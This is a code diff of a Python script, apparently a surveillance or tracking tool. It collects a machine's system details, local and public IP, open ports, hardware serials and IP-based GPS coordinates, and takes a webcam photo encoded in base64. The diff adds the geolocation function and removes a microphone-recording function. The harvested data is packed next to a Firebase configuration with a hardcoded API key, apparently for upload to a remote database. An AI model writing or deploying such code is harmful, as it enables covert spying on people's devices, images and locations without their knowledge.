@@ -9,6 +9,8 @@ import os
 import pyrebase
 import base64
 
+
+
 def getmiIpPublica():
     pagina = urllib.urlopen('https://www.cual-es-mi-ip.net/').read()
     ip = re.search('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', pagina)
@@ -62,8 +64,9 @@ def getPuertosOpen():
 def getSerialDisk():
     c = wmi.WMI()
     for item in c.Win32_PhysicalMedia():
-        print item.SerialNumber
-        print item.Tag
+        s = item.SerialNumber
+        print str(s)
+        # print item.Tag
         break;
 
 def getSerialUUID():
@@ -74,7 +77,24 @@ def getSerialPlaca():
     print os.system('wmic baseboard get product,Manufacturer,version,serialnumber')
 
 def getInterfacesRed():
-    print os.system('netsh wlan show networks mode=bssid')
+    ARed = []
+    Red = os.system('netsh wlan show networks mode=bssid')
+    print (Red)
+    ARed.append(Red)
+
+def getUbicacionIP():
+    pagina = urllib.urlopen('https://es.geoipview.com/').read()
+    la = re.search('([L])+([a])+([t])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([0-9])+([.])+([0-9])\w+|([L])+([a])+([t])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([-][0-9]{0,})+([.])+([0-9])\w+', pagina)
+    lo = re.search('([L])+([o])+([n])+([g])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([0-9])+([.])+([0-9])\w+|([L])+([o])+([n])+([g])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([-][0-9]{0,})+([.])+([0-9])\w+', pagina)
+    regex_coordenadas = r'([0-9])+([.])\w+|([-])([0-9])+([.])\w+'
+    lat = re.search(regex_coordenadas, str(la.group(0)))
+    long = re.search(regex_coordenadas, str(lo.group(0)))
+    gps = {
+        'latitud':lat.group(0),
+        'longitud':long.group(0)
+    }
+    return gps
+
 
 
 def getFoto():
@@ -94,112 +114,78 @@ def getFoto():
     return image_64_encode
     cap.release()
 
-def getAudio():
-    # se definen parametros
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 2
-    RATE = 44100
-    CHUNK = 1024
-    duracion = 10
-    archivo = "grabacion.wav"
-
-    #se inicia pyaudio
-    audio = pyaudio.PyAudio()
-    stream = audio.open(format=FORMAT,channels=CHANNELS, rate=RATE,
-        input=True,
-        frames_per_buffer=CHUNK)
-
-    #se inicia la grabacion
-    print("grabando...")
-    frames=[]
-    for i in range(0, int(RATE/CHUNK*duracion)):
-        data=stream.read(CHUNK)
-        frames.append(data)
-    print("grabacion terminada")
-
-    # se detiene la grabacion
-    stream.stop_stream()
-    stream.close()
-    audio.terminate()
-
-    waveFile = wave.open(archivo, 'wb')
-    waveFile.setnchannels(CHANNELS)
-    waveFile.setsampwidth(audio.get_sample_size(FORMAT))
-    waveFile.setframerate(RATE)
-    waveFile.writeframes(b''.join(frames))
-    waveFile.close()
-
 platform_data = platform.uname()
-print ('')
-print ('')
-ifs = ('-------Datos Del Sistema------')
-so = ('Sistema Operativo : ' + str(platform_data[0]))
-nu = ('Nombre De Usuario       : ' + str(platform.node()))
-vs = ('Version   : ' + str(platform.version()))
-aq = ('Arquitectura      : '+ str(platform.machine()))
-pc = ('Procesador: '+ str(platform.processor()))
-DSistema = (str(ifs), so,nu,vs,aq,pc)
-print (str(DSistema))
-print ('')
-print ('')
-ifr = ('-------Datos de Red------')
-nr = ('Nombre de Usuario En Red : ' + str(platform.node()))
-ipl = ('Ip Local: ' + str(getMiIpLocal(platform.node())))
-ipp = ('Ip Publica: ' + str(getmiIpPublica()))
-DRed = (ifr,nr,ipl,ipp)
-print (str(DRed))
-print ('')
-print ('')
-ifd = ('-------Espacios en disco------')
-ed = str(getEspacioEnDisco())
-DDisk = (str(ifd),str(ed))
-print (str(DDisk))
-print ('')
-print ('')
-ifp = ('-------Puertos Open------')
-print (ifp)
-print ('Scaneando Puertos....')
-pu= getPuertosOpen()
-DPuertos = (ifp,pu)
-print (DPuertos)
-print ('')
-print ('')
-print ('-------Ubicacion------')
-# getUbicacion()
-msjU = "Datos Ubicacion",
-DUbicacion = (msjU)
-print (DUbicacion)
-print ('')
-print ('')
-print ('-------Foto------')
-f = getFoto()
-msjF = "Datos Foto",
-DFoto = (msjF, f)
-print (DFoto)
-print ('')
-print ('')
-print ('-------Audio------')
-# getAudio()
-msjA = "Datos Audio",
-DAudio = (msjA)
-print (DAudio)
-print ('')
-print ('')
-print ('-------N serial Disco------')
-getSerialDisk()
-print ('')
-print ('')
-print ('-------N serial UUID------')
-getSerialUUID()
-print ('')
-print ('')
-print ('-------Imformacion de la placa base------')
-getSerialPlaca()
-print ('')
-print ('')
-print ('-------Imformacion de las Interfaces de Red------')
-getInterfacesRed()
-DUniversal = (DSistema + DRed + DDisk + DPuertos + DUbicacion + DFoto + DAudio)
+if str(platform_data[0]) == "Windows":
+    print ('')
+    print ('')
+    ifs = ('-------Datos Del Sistema------')
+    so = ('Sistema Operativo : ' + str(platform_data[0]))
+    nu = ('Nombre De Usuario       : ' + str(platform.node()))
+    vs = ('Version   : ' + str(platform.version()))
+    aq = ('Arquitectura      : '+ str(platform.machine()))
+    pc = ('Procesador: '+ str(platform.processor()))
+    DSistema = (str(ifs), so,nu,vs,aq,pc)
+    # print (str(DSistema))
+    print ('')
+    print ('')
+    ifr = ('-------Datos de Red------')
+    nr = ('Nombre de Usuario En Red : ' + str(platform.node()))
+    ipl = ('Ip Local: ' + str(getMiIpLocal(platform.node())))
+    ipp = ('Ip Publica: ' + str(getmiIpPublica()))
+    DRed = (ifr,nr,ipl,ipp)
+    # print (str(DRed))
+    print ('')
+    print ('')
+    ifd = ('-------Espacios en disco------')
+    ed = str(getEspacioEnDisco())
+    DDisk = (str(ifd),str(ed))
+    # print (str(DDisk))
+    print ('')
+    print ('')
+    ifp = ('-------Puertos Open------')
+    # print (ifp)
+    print ('Scaneando Puertos....')
+    pu= getPuertosOpen()
+    DPuertos = (ifp,pu)
+    # print (DPuertos)
+    print ('')
+    print ('')
+    print ('-------Ubicacion------')
+
+    msjU = getUbicacionIP()
+    DUbicacion = (msjU)
+    # print (DUbicacion)
+    print ('')
+    print ('')
+    print ('-------Foto------')
+    f = getFoto()
+    msjF = "Datos Foto",
+    DFoto = (msjF, f)
+    # print (DFoto)
+    print ('')
+    print ('')
+    # print ('-------N serial Disco------')
+    # DNSDisk = getSerialDisk()
+    # print (DNSDisk)
+    # print ('')
+    # print ('')
+    # print ('-------N serial UUID------')
+    # DNSUUID = str(getSerialUUID())
+    # print (DNSUUID)
+    # print ('')
+    # print ('')
+    # print ('-------Imformacion de la placa base------')
+    # DInfoplaca = str(getSerialPlaca())
+    # print (DInfoplaca)
+    # print ('')
+    # print ('')
+    # print ('-------Imformacion de las Interfaces de Red------')
+    # DInfored = str(getInterfacesRed())
+    # print (DInfored)
+else:
+    print ('linux')
+# DUniversal = (DSistema + DRed + DDisk + DPuertos + DUbicacion + DFoto + DNSDisk + DNSUUID + DInfoplaca + DInfored)
+DUniversal = ({'DSistema':DSistema,'DRed':DRed,'DDisk':DDisk,'DPuertos':DPuertos,'DUbicacion':DUbicacion,'DFoto':DFoto})
 config = {
     "apiKey": "AIzaSyDNyT41R1AXYpp6k7xP3m4S_EIUGibcj8s",
     "authDomain": "trape-py-1554172486593.firebaseapp.com",
